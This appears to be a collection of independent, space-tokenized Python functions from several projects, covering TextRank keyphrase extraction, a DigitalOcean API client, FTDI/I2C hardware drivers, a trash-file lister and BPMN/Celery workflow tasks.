def filter_quotes ( text , is_email = True ) : global DEBUG global PAT_FORWARD , PAT_REPLIED , PAT_UNSUBSC if is_email : text = filter ( lambda x : x in string . printable , text ) if DEBUG : print ( "text:" , text ) # strip off quoted text in a forward m = PAT_FORWARD . split ( text , re . M ) if m and len ( m ) > 1 : text = m [ 0 ] # strip off quoted text in a reply m = PAT_REPLIED . split ( text , re . M ) if m and len ( m ) > 1 : text = m [ 0 ] # strip off any trailing unsubscription notice m = PAT_UNSUBSC . split ( text , re . M ) if m : text = m [ 0 ] # replace any remaining quoted text with blank lines lines = [ ] for line in text . split ( "\n" ) : if line . startswith ( ">" ) : lines . append ( "" ) else : lines . append ( line ) return list ( split_grafs ( lines ) )
def fix_microsoft ( foo ) : i = 0 bar = [ ] while i < len ( foo ) : text , lemma , pos , tag = foo [ i ] if ( text == "#" ) and ( i > 0 ) : prev_tok = bar [ - 1 ] prev_tok [ 0 ] += "#" prev_tok [ 1 ] += "#" bar [ - 1 ] = prev_tok else : bar . append ( foo [ i ] ) i += 1 return bar
def fix_hypenation ( foo ) : i = 0 bar = [ ] while i < len ( foo ) : text , lemma , pos , tag = foo [ i ] if ( tag == "HYPH" ) and ( i > 0 ) and ( i < len ( foo ) - 1 ) : prev_tok = bar [ - 1 ] next_tok = foo [ i + 1 ] prev_tok [ 0 ] += "-" + next_tok [ 0 ] prev_tok [ 1 ] += "-" + next_tok [ 1 ] bar [ - 1 ] = prev_tok i += 2 else : bar . append ( foo [ i ] ) i += 1 return bar
def parse_doc ( json_iter ) : global DEBUG for meta in json_iter : base_idx = 0 for graf_text in filter_quotes ( meta [ "text" ] , is_email = False ) : if DEBUG : print ( "graf_text:" , graf_text ) grafs , new_base_idx = parse_graf ( meta [ "id" ] , graf_text , base_idx ) base_idx = new_base_idx for graf in grafs : yield graf
def get_tiles ( graf , size = 3 ) : keeps = list ( filter ( lambda w : w . word_id > 0 , graf ) ) keeps_len = len ( keeps ) for i in iter ( range ( 0 , keeps_len - 1 ) ) : w0 = keeps [ i ] for j in iter ( range ( i + 1 , min ( keeps_len , i + 1 + size ) ) ) : w1 = keeps [ j ] if ( w1 . idx - w0 . idx ) <= size : yield ( w0 . root , w1 . root , )
def build_graph ( json_iter ) : global DEBUG , WordNode graph = nx . DiGraph ( ) for meta in json_iter : if DEBUG : print ( meta [ "graf" ] ) for pair in get_tiles ( map ( WordNode . _make , meta [ "graf" ] ) ) : if DEBUG : print ( pair ) for word_id in pair : if not graph . has_node ( word_id ) : graph . add_node ( word_id ) try : graph . edge [ pair [ 0 ] ] [ pair [ 1 ] ] [ "weight" ] += 1.0 except KeyError : graph . add_edge ( pair [ 0 ] , pair [ 1 ] , weight = 1.0 ) return graph
def write_dot ( graph , ranks , path = "graph.dot" ) : dot = Digraph ( ) for node in graph . nodes ( ) : dot . node ( node , "%s %0.3f" % ( node , ranks [ node ] ) ) for edge in graph . edges ( ) : dot . edge ( edge [ 0 ] , edge [ 1 ] , constraint = "false" ) with open ( path , 'w' ) as f : f . write ( dot . source )
def render_ranks ( graph , ranks , dot_file = "graph.dot" ) : if dot_file : write_dot ( graph , ranks , path = dot_file )
def text_rank ( path ) : graph = build_graph ( json_iter ( path ) ) ranks = nx . pagerank ( graph ) return graph , ranks
def find_chunk ( phrase , np ) : for i in iter ( range ( 0 , len ( phrase ) ) ) : parsed_np = find_chunk_sub ( phrase , np , i ) if parsed_np : return parsed_np
def enumerate_chunks ( phrase , spacy_nlp ) : if ( len ( phrase ) > 1 ) : found = False text = " " . join ( [ rl . text for rl in phrase ] ) doc = spacy_nlp ( text . strip ( ) , parse = True ) for np in doc . noun_chunks : if np . text != text : found = True yield np . text , find_chunk ( phrase , np . text . split ( " " ) ) if not found and all ( [ rl . pos [ 0 ] != "v" for rl in phrase ] ) : yield text , phrase
def collect_keyword ( sent , ranks , stopwords ) : for w in sent : if ( w . word_id > 0 ) and ( w . root in ranks ) and ( w . pos [ 0 ] in "NV" ) and ( w . root not in stopwords ) : rl = RankedLexeme ( text = w . raw . lower ( ) , rank = ranks [ w . root ] / 2.0 , ids = [ w . word_id ] , pos = w . pos . lower ( ) , count = 1 ) if DEBUG : print ( rl ) yield rl
def collect_entities ( sent , ranks , stopwords , spacy_nlp ) : global DEBUG sent_text = " " . join ( [ w . raw for w in sent ] ) if DEBUG : print ( "sent:" , sent_text ) for ent in spacy_nlp ( sent_text ) . ents : if DEBUG : print ( "NER:" , ent . label_ , ent . text ) if ( ent . label_ not in [ "CARDINAL" ] ) and ( ent . text . lower ( ) not in stopwords ) : w_ranks , w_ids = find_entity ( sent , ranks , ent . text . split ( " " ) , 0 ) if w_ranks and w_ids : rl = RankedLexeme ( text = ent . text . lower ( ) , rank = w_ranks , ids = w_ids , pos = "np" , count = 1 ) if DEBUG : print ( rl ) yield rl
def collect_phrases ( sent , ranks , spacy_nlp ) : tail = 0 last_idx = sent [ 0 ] . idx - 1 phrase = [ ] while tail < len ( sent ) : w = sent [ tail ] if ( w . word_id > 0 ) and ( w . root in ranks ) and ( ( w . idx - last_idx ) == 1 ) : # keep collecting... rl = RankedLexeme ( text = w . raw . lower ( ) , rank = ranks [ w . root ] , ids = w . word_id , pos = w . pos . lower ( ) , count = 1 ) phrase . append ( rl ) else : # just hit a phrase boundary for text , p in enumerate_chunks ( phrase , spacy_nlp ) : if p : id_list = [ rl . ids for rl in p ] rank_list = [ rl . rank for rl in p ] np_rl = RankedLexeme ( text = text , rank = rank_list , ids = id_list , pos = "np" , count = 1 ) if DEBUG : print ( np_rl ) yield np_rl phrase = [ ] last_idx = w . idx tail += 1
def normalize_key_phrases ( path , ranks , stopwords = None , spacy_nlp = None , skip_ner = True ) : global STOPWORDS , SPACY_NLP # set up the stop words if ( type ( stopwords ) is list ) or ( type ( stopwords ) is set ) : # explicit conversion to a set, for better performance stopwords = set ( stopwords ) else : if not STOPWORDS : STOPWORDS = load_stopwords ( stopwords ) stopwords = STOPWORDS # set up the spaCy NLP parser if not spacy_nlp : if not SPACY_NLP : SPACY_NLP = spacy . load ( "en" ) spacy_nlp = SPACY_NLP # collect keyphrases single_lex = { } phrase_lex = { } if isinstance ( path , str ) : path = json_iter ( path ) for meta in path : sent = [ w for w in map ( WordNode . _make , meta [ "graf" ] ) ] for rl in collect_keyword ( sent , ranks , stopwords ) : id = str ( rl . ids ) if id not in single_lex : single_lex [ id ] = rl else : prev_lex = single_lex [ id ] single_lex [ id ] = rl . _replace ( count = prev_lex . count + 1 ) if not skip_ner : for rl in collect_entities ( sent , ranks , stopwords , spacy_nlp ) : id = str ( rl . ids ) if id not in phrase_lex : phrase_lex [ id ] = rl else : prev_lex = phrase_lex [ id ] phrase_lex [ id ] = rl . _replace ( count = prev_lex . count + 1 ) for rl in collect_phrases ( sent , ranks , spacy_nlp ) : id = str ( rl . ids ) if id not in phrase_lex : phrase_lex [ id ] = rl else : prev_lex = phrase_lex [ id ] phrase_lex [ id ] = rl . _replace ( count = prev_lex . count + 1 ) # normalize ranks across single keywords and longer phrases: #    * boost the noun phrases based on their length #    * penalize the noun phrases for repeated words rank_list = [ rl . rank for rl in single_lex . values ( ) ] if len ( rank_list ) < 1 : max_single_rank = 0 else : max_single_rank = max ( rank_list ) repeated_roots = { } for rl in sorted ( phrase_lex . values ( ) , key = lambda rl : len ( rl ) , reverse = True ) : rank_list = [ ] for i in iter ( range ( 0 , len ( rl . ids ) ) ) : id = rl . ids [ i ] if not id in repeated_roots : repeated_roots [ id ] = 1.0 rank_list . append ( rl . rank [ i ] ) else : repeated_roots [ id ] += 1.0 rank_list . append ( rl . rank [ i ] / repeated_roots [ id ] ) phrase_rank = calc_rms ( rank_list ) single_lex [ str ( rl . ids ) ] = rl . _replace ( rank = phrase_rank ) # scale all the ranks together, so they sum to 1.0 sum_ranks = sum ( [ rl . rank for rl in single_lex . values ( ) ] ) for rl in sorted ( single_lex . values ( ) , key = lambda rl : rl . rank , reverse = True ) : if sum_ranks > 0.0 : rl = rl . _replace ( rank = rl . rank / sum_ranks ) elif rl . rank == 0.0 : rl = rl . _replace ( rank = 0.1 ) rl = rl . _replace ( text = re . sub ( r"\s([\.\,\-\+\:\@])\s" , r"\1" , rl . text ) ) yield rl
def mh_digest ( data ) : num_perm = 512 m = MinHash ( num_perm ) for d in data : m . update ( d . encode ( 'utf8' ) ) return m
def top_sentences ( kernel , path ) : key_sent = { } i = 0 if isinstance ( path , str ) : path = json_iter ( path ) for meta in path : graf = meta [ "graf" ] tagged_sent = [ WordNode . _make ( x ) for x in graf ] text = " " . join ( [ w . raw for w in tagged_sent ] ) m_sent = mh_digest ( [ str ( w . word_id ) for w in tagged_sent ] ) dist = sum ( [ m_sent . jaccard ( m ) * rl . rank for rl , m in kernel ] ) key_sent [ text ] = ( dist , i ) i += 1 for text , ( dist , i ) in sorted ( key_sent . items ( ) , key = lambda x : x [ 1 ] [ 0 ] , reverse = True ) : yield SummarySent ( dist = dist , idx = i , text = text )
def limit_keyphrases ( path , phrase_limit = 20 ) : rank_thresh = None if isinstance ( path , str ) : lex = [ ] for meta in json_iter ( path ) : rl = RankedLexeme ( * * meta ) lex . append ( rl ) else : lex = path if len ( lex ) > 0 : rank_thresh = statistics . mean ( [ rl . rank for rl in lex ] ) else : rank_thresh = 0 used = 0 for rl in lex : if rl . pos [ 0 ] != "v" : if ( used > phrase_limit ) or ( rl . rank < rank_thresh ) : return used += 1 yield rl . text . replace ( " - " , "-" )
def limit_sentences ( path , word_limit = 100 ) : word_count = 0 if isinstance ( path , str ) : path = json_iter ( path ) for meta in path : if not isinstance ( meta , SummarySent ) : p = SummarySent ( * * meta ) else : p = meta sent_text = p . text . strip ( ) . split ( " " ) sent_len = len ( sent_text ) if ( word_count + sent_len ) > word_limit : break else : word_count += sent_len yield sent_text , p . idx
def make_sentence ( sent_text ) : lex = [ ] idx = 0 for word in sent_text : if len ( word ) > 0 : if ( idx > 0 ) and not ( word [ 0 ] in ",.:;!?-\"'" ) : lex . append ( " " ) lex . append ( word ) idx += 1 return "" . join ( lex )
def json_iter ( path ) : with open ( path , 'r' ) as f : for line in f . readlines ( ) : yield json . loads ( line )
def pretty_print ( obj , indent = False ) : if indent : return json . dumps ( obj , sort_keys = True , indent = 2 , separators = ( ',' , ': ' ) ) else : return json . dumps ( obj , sort_keys = True )
def get_object ( cls , api_token , snapshot_id ) : snapshot = cls ( token = api_token , id = snapshot_id ) snapshot . load ( ) return snapshot
def load ( self ) : tags = self . get_data ( "tags/%s" % self . name ) tag = tags [ 'tag' ] for attr in tag . keys ( ) : setattr ( self , attr , tag [ attr ] ) return self
def create ( self , * * kwargs ) : for attr in kwargs . keys ( ) : setattr ( self , attr , kwargs [ attr ] ) params = { "name" : self . name } output = self . get_data ( "tags" , type = "POST" , params = params ) if output : self . name = output [ 'tag' ] [ 'name' ] self . resources = output [ 'tag' ] [ 'resources' ]
def get_object ( cls , api_token , action_id ) : action = cls ( token = api_token , id = action_id ) action . load_directly ( ) return action
def get_data ( self , * args , * * kwargs ) : data = super ( Droplet , self ) . get_data ( * args , * * kwargs ) if "type" in kwargs : if kwargs [ "type" ] == POST : self . __check_actions_in_data ( data ) return data
def get_kernel_available ( self ) : kernels = list ( ) data = self . get_data ( "droplets/%s/kernels/" % self . id ) while True : for jsond in data [ u'kernels' ] : kernel = Kernel ( * * jsond ) kernel . token = self . token kernels . append ( kernel ) try : url = data [ u'links' ] [ u'pages' ] . get ( u'next' ) if not url : break data = self . get_data ( url ) except KeyError : # No links. break return kernels
def get_object ( cls , api_token , domain_name ) : domain = cls ( token = api_token , name = domain_name ) domain . load ( ) return domain
def get_records ( self , params = None ) : if params is None : params = { } # URL https://api.digitalocean.com/v2/domains/[NAME]/records/ records = [ ] data = self . get_data ( "domains/%s/records/" % self . name , type = GET , params = params ) for record_data in data [ 'domain_records' ] : record = Record ( domain_name = self . name , * * record_data ) record . token = self . token records . append ( record ) return records
def get_object ( cls , api_token ) : acct = cls ( token = api_token ) acct . load ( ) return acct
def get_object ( cls , api_token , firewall_id ) : firewall = cls ( token = api_token , id = firewall_id ) firewall . load ( ) return firewall
def add_tags ( self , tags ) : return self . get_data ( "firewalls/%s/tags" % self . id , type = POST , params = { "tags" : tags } )
def remove_tags ( self , tags ) : return self . get_data ( "firewalls/%s/tags" % self . id , type = DELETE , params = { "tags" : tags } )
def get_object ( cls , api_token , ssh_key_id ) : ssh_key = cls ( token = api_token , id = ssh_key_id ) ssh_key . load ( ) return ssh_key
def create ( self ) : input_params = { "name" : self . name , "public_key" : self . public_key , } data = self . get_data ( "account/keys/" , type = POST , params = input_params ) if data : self . id = data [ 'ssh_key' ] [ 'id' ]
def edit ( self ) : input_params = { "name" : self . name , "public_key" : self . public_key , } data = self . get_data ( "account/keys/%s" % self . id , type = PUT , params = input_params ) if data : self . id = data [ 'ssh_key' ] [ 'id' ]
def get_all_regions ( self ) : data = self . get_data ( "regions/" ) regions = list ( ) for jsoned in data [ 'regions' ] : region = Region ( * * jsoned ) region . token = self . token regions . append ( region ) return regions
def get_all_droplets ( self , tag_name = None ) : params = dict ( ) if tag_name : params [ "tag_name" ] = tag_name data = self . get_data ( "droplets/" , params = params ) droplets = list ( ) for jsoned in data [ 'droplets' ] : droplet = Droplet ( * * jsoned ) droplet . token = self . token for net in droplet . networks [ 'v4' ] : if net [ 'type' ] == 'private' : droplet . private_ip_address = net [ 'ip_address' ] if net [ 'type' ] == 'public' : droplet . ip_address = net [ 'ip_address' ] if droplet . networks [ 'v6' ] : droplet . ip_v6_address = droplet . networks [ 'v6' ] [ 0 ] [ 'ip_address' ] if "backups" in droplet . features : droplet . backups = True else : droplet . backups = False if "ipv6" in droplet . features : droplet . ipv6 = True else : droplet . ipv6 = False if "private_networking" in droplet . features : droplet . private_networking = True else : droplet . private_networking = False droplets . append ( droplet ) return droplets
def get_droplet ( self , droplet_id ) : return Droplet . get_object ( api_token = self . token , droplet_id = droplet_id )
def get_all_sizes ( self ) : data = self . get_data ( "sizes/" ) sizes = list ( ) for jsoned in data [ 'sizes' ] : size = Size ( * * jsoned ) size . token = self . token sizes . append ( size ) return sizes
def get_images ( self , private = False , type = None ) : params = { } if private : params [ 'private' ] = 'true' if type : params [ 'type' ] = type data = self . get_data ( "images/" , params = params ) images = list ( ) for jsoned in data [ 'images' ] : image = Image ( * * jsoned ) image . token = self . token images . append ( image ) return images
def get_all_domains ( self ) : data = self . get_data ( "domains/" ) domains = list ( ) for jsoned in data [ 'domains' ] : domain = Domain ( * * jsoned ) domain . token = self . token domains . append ( domain ) return domains
def get_domain ( self , domain_name ) : return Domain . get_object ( api_token = self . token , domain_name = domain_name )
def get_all_sshkeys ( self ) : data = self . get_data ( "account/keys/" ) ssh_keys = list ( ) for jsoned in data [ 'ssh_keys' ] : ssh_key = SSHKey ( * * jsoned ) ssh_key . token = self . token ssh_keys . append ( ssh_key ) return ssh_keys
def get_ssh_key ( self , ssh_key_id ) : return SSHKey . get_object ( api_token = self . token , ssh_key_id = ssh_key_id )
def get_all_tags ( self ) : data = self . get_data ( "tags" ) return [ Tag ( token = self . token , * * tag ) for tag in data [ 'tags' ] ]
def get_all_floating_ips ( self ) : data = self . get_data ( "floating_ips" ) floating_ips = list ( ) for jsoned in data [ 'floating_ips' ] : floating_ip = FloatingIP ( * * jsoned ) floating_ip . token = self . token floating_ips . append ( floating_ip ) return floating_ips
def get_floating_ip ( self , ip ) : return FloatingIP . get_object ( api_token = self . token , ip = ip )
def get_all_load_balancers ( self ) : data = self . get_data ( "load_balancers" ) load_balancers = list ( ) for jsoned in data [ 'load_balancers' ] : load_balancer = LoadBalancer ( * * jsoned ) load_balancer . token = self . token load_balancer . health_check = HealthCheck ( * * jsoned [ 'health_check' ] ) load_balancer . sticky_sessions = StickySesions ( * * jsoned [ 'sticky_sessions' ] ) forwarding_rules = list ( ) for rule in jsoned [ 'forwarding_rules' ] : forwarding_rules . append ( ForwardingRule ( * * rule ) ) load_balancer . forwarding_rules = forwarding_rules load_balancers . append ( load_balancer ) return load_balancers
def get_all_certificates ( self ) : data = self . get_data ( "certificates" ) certificates = list ( ) for jsoned in data [ 'certificates' ] : cert = Certificate ( * * jsoned ) cert . token = self . token certificates . append ( cert ) return certificates
def get_snapshot ( self , snapshot_id ) : return Snapshot . get_object ( api_token = self . token , snapshot_id = snapshot_id )
def get_all_snapshots ( self ) : data = self . get_data ( "snapshots/" ) return [ Snapshot ( token = self . token , * * snapshot ) for snapshot in data [ 'snapshots' ] ]
def get_droplet_snapshots ( self ) : data = self . get_data ( "snapshots?resource_type=droplet" ) return [ Snapshot ( token = self . token , * * snapshot ) for snapshot in data [ 'snapshots' ] ]
def get_volume_snapshots ( self ) : data = self . get_data ( "snapshots?resource_type=volume" ) return [ Snapshot ( token = self . token , * * snapshot ) for snapshot in data [ 'snapshots' ] ]
def get_all_volumes ( self , region = None ) : if region : url = "volumes?region={}" . format ( region ) else : url = "volumes" data = self . get_data ( url ) volumes = list ( ) for jsoned in data [ 'volumes' ] : volume = Volume ( * * jsoned ) volume . token = self . token volumes . append ( volume ) return volumes
def get_volume ( self , volume_id ) : return Volume . get_object ( api_token = self . token , volume_id = volume_id )
def get_all_firewalls ( self ) : data = self . get_data ( "firewalls" ) firewalls = list ( ) for jsoned in data [ 'firewalls' ] : firewall = Firewall ( * * jsoned ) firewall . token = self . token in_rules = list ( ) for rule in jsoned [ 'inbound_rules' ] : in_rules . append ( InboundRule ( * * rule ) ) firewall . inbound_rules = in_rules out_rules = list ( ) for rule in jsoned [ 'outbound_rules' ] : out_rules . append ( OutboundRule ( * * rule ) ) firewall . outbound_rules = out_rules firewalls . append ( firewall ) return firewalls
def get_firewall ( self , firewall_id ) : return Firewall . get_object ( api_token = self . token , firewall_id = firewall_id , )
def get_object ( cls , api_token , domain , record_id ) : record = cls ( token = api_token , domain = domain , id = record_id ) record . load ( ) return record
def get_object ( cls , api_token , volume_id ) : volume = cls ( token = api_token , id = volume_id ) volume . load ( ) return volume
def get_object ( cls , api_token , cert_id ) : certificate = cls ( token = api_token , id = cert_id ) certificate . load ( ) return certificate
def stop ( self , pin ) : if pin not in self . pwm : raise ValueError ( 'Pin {0} is not configured as a PWM.  Make sure to first call start for the pin.' . format ( pin ) ) self . pwm [ pin ] . stop ( ) del self . pwm [ pin ]
def enable_FTDI_driver ( ) : logger . debug ( 'Enabling FTDI driver.' ) if sys . platform == 'darwin' : logger . debug ( 'Detected Mac OSX' ) # Mac OS commands to enable FTDI driver. _check_running_as_root ( ) subprocess . check_call ( 'kextload -b com.apple.driver.AppleUSBFTDI' , shell = True ) subprocess . check_call ( 'kextload /System/Library/Extensions/FTDIUSBSerialDriver.kext' , shell = True ) elif sys . platform . startswith ( 'linux' ) : logger . debug ( 'Detected Linux' ) # Linux commands to enable FTDI driver. _check_running_as_root ( ) subprocess . check_call ( 'modprobe -q ftdi_sio' , shell = True ) subprocess . check_call ( 'modprobe -q usbserial' , shell = True )
def close ( self ) : if self . _ctx is not None : ftdi . free ( self . _ctx ) self . _ctx = None
def _mpsse_enable ( self ) : # Reset MPSSE by sending mask = 0 and mode = 0 self . _check ( ftdi . set_bitmode , 0 , 0 ) # Enable MPSSE by sending mask = 0 and mode = 2 self . _check ( ftdi . set_bitmode , 0 , 2 )
def _idle ( self ) : # Put the I2C lines into an idle state with SCL and SDA high. self . _ft232h . setup_pins ( { 0 : GPIO . OUT , 1 : GPIO . OUT , 2 : GPIO . IN } , { 0 : GPIO . HIGH , 1 : GPIO . HIGH } )
def _transaction_end ( self ) : # Ask to return response bytes immediately. self . _command . append ( '\x87' ) # Send the entire command to the MPSSE. self . _ft232h . _write ( '' . join ( self . _command ) ) # Read response bytes and return them. return bytearray ( self . _ft232h . _poll_read ( self . _expected ) )
def _i2c_write_bytes ( self , data ) : for byte in data : # Write byte. self . _command . append ( str ( bytearray ( ( 0x11 , 0x00 , 0x00 , byte ) ) ) ) # Make sure pins are back in idle state with clock low and data high. self . _ft232h . output_pins ( { 0 : GPIO . LOW , 1 : GPIO . HIGH } , write = False ) self . _command . append ( self . _ft232h . mpsse_gpio ( ) * _REPEAT_DELAY ) # Read bit for ACK/NAK. self . _command . append ( '\x22\x00' ) # Increase expected response bytes. self . _expected += len ( data )
def write16 ( self , register , value , little_endian = True ) : value = value & 0xFFFF value_low = value & 0xFF value_high = ( value >> 8 ) & 0xFF if not little_endian : value_low , value_high = value_high , value_low self . _idle ( ) self . _transaction_start ( ) self . _i2c_start ( ) self . _i2c_write_bytes ( [ self . _address_byte ( False ) , register , value_low , value_high ] ) self . _i2c_stop ( ) response = self . _transaction_end ( ) self . _verify_acks ( response )
def writeList ( self , register , data ) : self . _idle ( ) self . _transaction_start ( ) self . _i2c_start ( ) self . _i2c_write_bytes ( [ self . _address_byte ( False ) , register ] + data ) self . _i2c_stop ( ) response = self . _transaction_end ( ) self . _verify_acks ( response )
def readS8 ( self , register ) : result = self . readU8 ( register ) if result > 127 : result -= 256 return result
def write8 ( self , register , value ) : value = value & 0xFF self . _bus . write_byte_data ( self . _address , register , value ) self . _logger . debug ( "Wrote 0x%02X to register 0x%02X" , value , register )
def write16 ( self , register , value ) : value = value & 0xFFFF self . _bus . write_word_data ( self . _address , register , value ) self . _logger . debug ( "Wrote 0x%04X to register pair 0x%02X, 0x%02X" , value , register , register + 1 )
def writeList ( self , register , data ) : self . _bus . write_i2c_block_data ( self . _address , register , data ) self . _logger . debug ( "Wrote to register 0x%02X: %s" , register , data )
def readU8 ( self , register ) : result = self . _bus . read_byte_data ( self . _address , register ) & 0xFF self . _logger . debug ( "Read 0x%02X from register 0x%02X" , result , register ) return result
def all_info_files ( self ) : try : for info_file in list_files_in_dir ( self . info_dir ) : if not os . path . basename ( info_file ) . endswith ( '.trashinfo' ) : self . on_non_trashinfo_found ( ) else : yield info_file except OSError : # when directory does not exist pass
def add_bpmn_files ( self , filenames ) : for filename in filenames : f = open ( filename , 'r' ) try : self . add_bpmn_xml ( ET . parse ( f ) , filename = filename ) finally : f . close ( )
def one ( nodes , or_none = False ) : if not nodes and or_none : return None assert len ( nodes ) == 1 , 'Expected 1 result. Received %d results.' % ( len ( nodes ) ) return nodes [ 0 ]
def get_event_definition ( self ) : messageEventDefinition = first ( self . xpath ( './/bpmn:messageEventDefinition' ) ) if messageEventDefinition is not None : return self . get_message_event_definition ( messageEventDefinition ) timerEventDefinition = first ( self . xpath ( './/bpmn:timerEventDefinition' ) ) if timerEventDefinition is not None : return self . get_timer_event_definition ( timerEventDefinition ) raise NotImplementedError ( 'Unsupported Intermediate Catch Event: %r' , ET . tostring ( self . node ) )
def parse_node ( self ) : try : self . task = self . create_task ( ) self . task . documentation = self . parser . _parse_documentation ( self . node , xpath = self . xpath , task_parser = self ) boundary_event_nodes = self . process_xpath ( './/bpmn:boundaryEvent[@attachedToRef="%s"]' % self . get_id ( ) ) if boundary_event_nodes : parent_task = _BoundaryEventParent ( self . spec , '%s.BoundaryEventParent' % self . get_id ( ) , self . task , lane = self . task . lane ) self . process_parser . parsed_nodes [ self . node . get ( 'id' ) ] = parent_task parent_task . connect_outgoing ( self . task , '%s.FromBoundaryEventParent' % self . get_id ( ) , None , None ) for boundary_event in boundary_event_nodes : b = self . process_parser . parse_node ( boundary_event ) parent_task . connect_outgoing ( b , '%s.FromBoundaryEventParent' % boundary_event . get ( 'id' ) , None , None ) else : self . process_parser . parsed_nodes [ self . node . get ( 'id' ) ] = self . task children = [ ] outgoing = self . process_xpath ( './/bpmn:sequenceFlow[@sourceRef="%s"]' % self . get_id ( ) ) if len ( outgoing ) > 1 and not self . handles_multiple_outgoing ( ) : raise ValidationException ( 'Multiple outgoing flows are not supported for ' 'tasks of type' , node = self . node , filename = self . process_parser . filename ) for sequence_flow in outgoing : target_ref = sequence_flow . get ( 'targetRef' ) target_node = one ( self . process_xpath ( './/*[@id="%s"]' % target_ref ) ) c = self . process_parser . parse_node ( target_node ) children . append ( ( c , target_node , sequence_flow ) ) if children : default_outgoing = self . node . get ( 'default' ) if not default_outgoing : ( c , target_node , sequence_flow ) = children [ 0 ] default_outgoing = sequence_flow . get ( 'id' ) for ( c , target_node , sequence_flow ) in children : self . connect_outgoing ( c , target_node , sequence_flow , sequence_flow . get ( 'id' ) == default_outgoing ) return parent_task if boundary_event_nodes else self . task except ValidationException : raise except Exception as ex : exc_info = sys . exc_info ( ) tb = "" . join ( traceback . format_exception ( exc_info [ 0 ] , exc_info [ 1 ] , exc_info [ 2 ] ) ) LOG . error ( "%r\n%s" , ex , tb ) raise ValidationException ( "%r" % ( ex ) , node = self . node , filename = self . process_parser . filename )
def get_outgoing_sequence_names ( self ) : return sorted ( [ s . name for s in list ( self . outgoing_sequence_flows_by_id . values ( ) ) ] )
def _start ( self , my_task , force = False ) : if ( not hasattr ( my_task , 'subprocess' ) ) or my_task . subprocess is None : my_task . subprocess = subprocess . Popen ( self . args , stderr = subprocess . STDOUT , stdout = subprocess . PIPE ) if my_task . subprocess : my_task . subprocess . poll ( ) if my_task . subprocess . returncode is None : # Still waiting return False else : results = my_task . subprocess . communicate ( ) my_task . results = results return True return False
def _ready ( self ) : if self . _has_state ( self . COMPLETED ) or self . _has_state ( self . CANCELLED ) : return self . _set_state ( self . READY ) self . task_spec . _on_ready ( self )
def get_state_name ( self ) : state_name = [ ] for state , name in list ( self . state_names . items ( ) ) : if self . _has_state ( state ) : state_name . append ( name ) return '|' . join ( state_name )
def _inherit_data ( self ) : LOG . debug ( "'%s' inheriting data from '%s'" % ( self . get_name ( ) , self . parent . get_name ( ) ) , extra = dict ( data = self . parent . data ) ) self . set_data ( * * self . parent . data )
def _eval_args ( args , my_task ) : results = [ ] for arg in args : if isinstance ( arg , Attrib ) or isinstance ( arg , PathAttrib ) : results . append ( valueof ( my_task , arg ) ) else : results . append ( arg ) return results
def _eval_kwargs ( kwargs , my_task ) : results = { } for kwarg , value in list ( kwargs . items ( ) ) : if isinstance ( value , Attrib ) or isinstance ( value , PathAttrib ) : results [ kwarg ] = valueof ( my_task , value ) else : results [ kwarg ] = value return results
def _restart ( self , my_task ) : if not my_task . _has_state ( Task . WAITING ) : raise WorkflowException ( my_task , "Cannot refire a task that is not" "in WAITING state" ) # Check state of existing call and abort it (save history) if my_task . _get_internal_data ( 'task_id' ) is not None : if not hasattr ( my_task , 'async_call' ) : task_id = my_task . _get_internal_data ( 'task_id' ) my_task . async_call = default_app . AsyncResult ( task_id ) my_task . deserialized = True my_task . async_call . state # manually refresh async_call = my_task . async_call if async_call . state == 'FAILED' : pass elif async_call . state in [ 'RETRY' , 'PENDING' , 'STARTED' ] : async_call . revoke ( ) LOG . info ( "Celery task '%s' was in %s state and was revoked" % ( async_call . state , async_call ) ) elif async_call . state == 'SUCCESS' : LOG . warning ( "Celery task '%s' succeeded, but a refire was " "requested" % async_call ) self . _clear_celery_task_data ( my_task ) # Retrigger return self . _start ( my_task )
def _clear_celery_task_data ( self , my_task ) : # Save history if 'task_id' in my_task . internal_data : # Save history for diagnostics/forensics history = my_task . _get_internal_data ( 'task_history' , [ ] ) history . append ( my_task . _get_internal_data ( 'task_id' ) ) del my_task . internal_data [ 'task_id' ] my_task . _set_internal_data ( task_history = history ) if 'task_state' in my_task . internal_data : del my_task . internal_data [ 'task_state' ] if 'error' in my_task . internal_data : del my_task . internal_data [ 'error' ] if hasattr ( my_task , 'async_call' ) : delattr ( my_task , 'async_call' ) if hasattr ( my_task , 'deserialized' ) : delattr ( my_task , 'deserialized' )
def _start ( self , my_task , force = False ) : # Deserialize async call if necessary if not hasattr ( my_task , 'async_call' ) and my_task . _get_internal_data ( 'task_id' ) is not None : task_id = my_task . _get_internal_data ( 'task_id' ) my_task . async_call = default_app . AsyncResult ( task_id ) my_task . deserialized = True LOG . debug ( "Reanimate AsyncCall %s" % task_id ) # Make the call if not already done if not hasattr ( my_task , 'async_call' ) : self . _send_call ( my_task ) # Get call status (and manually refresh if deserialized) if getattr ( my_task , "deserialized" , False ) : my_task . async_call . state # must manually refresh if deserialized if my_task . async_call . state == 'FAILURE' : LOG . debug ( "Async Call for task '%s' failed: %s" % ( my_task . get_name ( ) , my_task . async_call . info ) ) info = { } info [ 'traceback' ] = my_task . async_call . traceback info [ 'info' ] = Serializable ( my_task . async_call . info ) info [ 'state' ] = my_task . async_call . state my_task . _set_internal_data ( task_state = info ) elif my_task . async_call . state == 'RETRY' : info = { } info [ 'traceback' ] = my_task . async_call . traceback info [ 'info' ] = Serializable ( my_task . async_call . info ) info [ 'state' ] = my_task . async_call . state my_task . _set_internal_data ( task_state = info ) elif my_task . async_call . ready ( ) : result = my_task . async_call . result if isinstance ( result , Exception ) : LOG . warn ( "Celery call %s failed: %s" % ( self . call , result ) ) my_task . _set_internal_data ( error = Serializable ( result ) ) return False LOG . debug ( "Completed celery call %s with result=%s" % ( self . call , result ) ) # Format result if self . result_key : data = { self . result_key : result } else : if isinstance ( result , dict ) : data = result else : data = { 'result' : result } # Load formatted result into internal_data if self . merge_results : merge_dictionary ( my_task . internal_data , data ) else : my_task . set_data ( * * data ) return True else : LOG . debug ( "async_call.ready()=%s. TryFire for '%s' " "returning False" % ( my_task . async_call . ready ( ) , my_task . get_name ( ) ) ) return False
def ancestors ( self ) : results = [ ] def recursive_find_ancestors ( task , stack ) : for input in task . inputs : if input not in stack : stack . append ( input ) recursive_find_ancestors ( input , stack ) recursive_find_ancestors ( self , results ) return results
